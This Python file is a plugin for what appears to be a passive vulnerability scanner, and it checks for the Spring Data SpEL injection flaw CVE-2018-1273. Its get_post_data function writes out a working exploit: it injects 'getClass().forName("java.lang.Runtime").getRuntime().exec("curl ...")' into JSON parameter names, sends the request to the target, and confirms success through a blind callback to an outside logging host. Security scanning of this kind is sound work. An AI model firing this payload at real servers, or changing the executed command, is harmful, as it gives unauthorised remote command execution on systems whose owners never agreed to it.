#!/ usr/bin/env
# coding=utf-8
#
# Copyright 2019 ztosec & https://www.zto.com/
#
# Licensed under the Apache License, Version 2.0 (the "License"); you may
# not use this file except in compliance with the License. You may obtain
# a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS, WITHOUT
# WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the
# License for the specific language governing permissions and limitations
# under the License.
"""
author: b5mali4
"""
import ssl
import json
import requests
from common.http_util import header_to_lowercase, HttpMethod, ContentType
from plugins.base.vuln_enum import VulnType
from plugins.base.base_checker import BaseChecker
from parser.base_traffic_parser import BaseTrafficParser
from parser.chrome_traffic_parser import ChromeTrafficParser


class Checker(BaseChecker):
    def check_logic(self, request_raw):
        """
        spel表达式执行漏洞
        :param request_raw: 
        :return: 
        """
        http_method = str(request_raw["method"]).lower()
        temp_url = str(request_raw["url"]).strip()
        temp_headers = header_to_lowercase(json.loads(request_raw['headers']))
        temp_data = request_raw['data'] if "data" in request_raw else None
        content_type = temp_headers[
            "content-type"] if temp_headers is not None and ContentType.NAME.lower() in temp_headers else None
        blind_poc, check_blind_poc_url, hunter_log_api_token = self.generate_blind_poc()

        if not blind_poc["data"]:
            return

        if blind_poc["type"] == "dns":
            attack_payload = "http://%s" % (blind_poc["data"])  # 得到的是一个域名，域名前缀为uuid
        elif blind_poc["type"] == "socket":
            attack_payload = "http://%s:%s/%s" % (
                blind_poc["data"]["host"], blind_poc["data"]["port"], blind_poc["data"]["uuid"])

        if http_method == HttpMethod.POST:
            if BaseChecker.get_parser_name(request_raw) == BaseTrafficParser.CHROME_PARSER:
                request_raw = ChromeTrafficParser.to_raw(url=temp_url, data=temp_data, http_method=http_method,
                                                         content_type=content_type)
            else:
                request_raw = {"url": temp_url, "data": temp_data, "http_method": http_method,
                               "content_type": content_type}

            curl_post_data = self.get_post_data(request_raw["data"], attack_payload, "curl")

            requests.request(method=http_method, url=temp_url, data=curl_post_data, headers=temp_headers, timeout=5)

            req = requests.get(check_blind_poc_url, headers={"token": hunter_log_api_token}, timeout=5)
            if req:
                response = req.json()
                if "status" in response and response["status"] == 200:
                    self.result['status'] = True
                    self.result['info'] = '%s 存在一个spel执行漏洞' % request_raw['url']
                    self.result['payload'] = curl_post_data

    def init_plugin_info(self):
        tag = "spring"
        name = "cve-2018-1273"
        author = "b5mali4"
        imp_version = "data-commons:1.13-1.13.10,2.0-2.0.5; data-rest:2.6-2.6.10,3.0-3.0.5"
        description = "在老版本的组件中，存在spel表达式执行漏洞，导致可以执行恶意命令，https://pivotal.io/security/cve-2018-1273"
        repair = "升级到新版本"
        type = VulnType.CMD_ECT
        temp_info = {"repair": repair, "name": name, "type": type, "description": description,
                     "imp_version": imp_version, "author": author, "tag": tag}
        self.info = dict(self.info, **temp_info)

    def get_post_data(self, temp_data, hunter_log_poc_url, type):
        """
        根据是wget还是curl构造数据
        :param temp_data: 
        :param hunter_log_poc_url: 
        :param type: 
        :return: 
        """
        temp_data = json.loads(temp_data)
        result = {}
        for key, value in temp_data.items():
            key = '{}[#this.getClass().forName("java.lang.Runtime").getRuntime().exec("{} {}")]'.format(key, type,
                                                                                                        hunter_log_poc_url)
            result[key] = value
        return json.dumps(result)
